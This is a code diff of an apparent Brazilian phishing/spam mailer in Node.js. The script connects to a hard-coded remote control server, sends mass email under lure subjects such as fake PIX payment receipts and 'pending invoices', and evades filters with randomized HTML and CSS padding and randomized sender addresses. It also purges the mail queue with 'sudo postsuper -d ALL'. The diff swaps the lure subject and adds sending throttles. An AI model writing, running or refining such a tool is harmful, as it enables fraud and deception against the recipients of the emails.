@@ -1,7 +1,7 @@
 const nodemailer = require("nodemailer");
 const htmlToText = require("nodemailer-html-to-text").htmlToText;
 var randomstring = require("randomstring");
-const crypto = require('crypto')
+const crypto = require("crypto");
 const { exec } = require("child_process");
 var io = require("socket.io-client");
 var socket = io.connect("http://173.212.219.58:3000", { reconnect: true });
@@ -11,6 +11,7 @@ const fs = require("fs");
 const hostName = os.hostname();
 var enviados = 0;
 var list;
+var travado = false;
 const elementos = [
   "-ms-user-select: none;",
   "-webkit-text-decoration-skip: objects;",
@@ -218,9 +219,7 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-  let subject = `Comprovante PIX chegou por e-mail -  Nr:${randomstring.generate(
-    9
-  )}-`;
+  let subject = `Segue Notas Pendentes -  Nr:${randomstring.generate(9)}-`;
   //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
   try {
     let transporter = nodemailer.createTransport({
@@ -253,14 +252,14 @@ async function sendEmail(email) {
         "@" +
         hostName +
         ">",
-      replyTo: 
+      replyTo:
         nome +
         " <" +
         "pagsystem" +
         randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
-        ">", 
+        ">",
       to: mailarray[0],
       subject: subject,
       html: html,
@@ -283,9 +282,10 @@ async function sendEmail(email) {
       ], */
     });
     enviados++;
-    if (enviados % 500 === 0) {
-      console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
+    if (enviados % 5000 === 0) {
+      travado = true;
       await sleep(60000);
+      travado = false;
       exec("sudo postsuper -d ALL", (error, stdout, stderr) => {
         if (error) {
           console.log(`error: ${error.message}`);
@@ -297,6 +297,11 @@ async function sendEmail(email) {
         }
         console.log(`stdout: ${stdout}`);
       });
+    } else if (enviados % 500 === 0) {
+      console.log(`Sent: ${hostName} - total enviados: ${enviados}`);
+      travado = true;
+      await sleep(60000);
+      travado = false;
     }
   } catch (error) {
     enviados++;
@@ -309,6 +314,9 @@ async function sendEmail(email) {
   }
 
   await sleep(100);
+  if (travado == true) {
+    await sleep(60000);
+  }
   if (list.length !== 0) sendEmail(list.shift());
 }
 
@@ -414,10 +422,9 @@ async function IDgenerator() {
   let randomico = await randomstring.generate({
     length: 100,
   });
-  let hash = crypto.createHash('md5').update(randomico).digest("hex");
+  let hash = crypto.createHash("md5").update(randomico).digest("hex");
   return hash;
 }
-
 
 async function cssgenerator() {
   let linhas = between(500, 1000);
